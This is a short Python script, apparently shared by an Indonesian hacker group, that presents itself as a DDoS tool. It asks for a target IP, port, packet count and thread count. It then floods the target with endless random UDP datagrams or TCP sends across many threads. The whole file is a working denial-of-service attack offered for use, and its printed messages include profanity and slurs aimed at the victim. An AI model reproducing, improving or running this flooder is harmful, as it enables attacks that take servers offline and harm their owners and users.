#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("DDOS DULU BOS 88")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? PM me ")
ip = str(input(" DdosAttackByTellez R| Ip:"))
port = int(input(" DdosAttackByTellez R | Port:"))
choice = str(input(" DdosAttackByTellez R | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByTellez R | Packets:"))
threads = int(input(" DdosAttackByTellez R | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | TELLEZ R |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Tellez nih bos!!!")
		except:
			s.close()
			print("[*] MAMPUS BABI MANGKANYA JANGAN LAWAN PANUTAN GUA SKYLER19 -TELLEZ R")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
